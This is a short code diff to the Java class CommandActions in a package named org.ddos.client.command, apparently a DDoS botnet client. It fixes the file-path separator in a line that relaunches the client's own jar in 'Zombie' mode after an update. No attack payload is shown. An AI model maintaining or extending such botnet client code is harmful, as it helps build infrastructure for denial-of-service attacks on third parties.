@@ -1,6 +1,7 @@
 package org.ddos.client.command;
 
 import java.io.BufferedReader;
+import java.io.File;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
@@ -414,8 +415,8 @@ public class CommandActions {
 
 						System.out.println("The client will now exit. Relaunch it in about ten seconds.");
 
-						Runtime.getRuntime()
-								.exec("java -jar " + System.getProperty("user.dir") + "\\" + Updater.NAME + " Zombie");
+						Runtime.getRuntime().exec("java -jar " + System.getProperty("user.dir") + File.separator
+								+ Updater.NAME + ".jar Zombie");
 						System.exit(0);
 					} else if (command.getCommandArguments()[0].equals("zombie")) {
 						if (!command.hasFlag("-i")) {
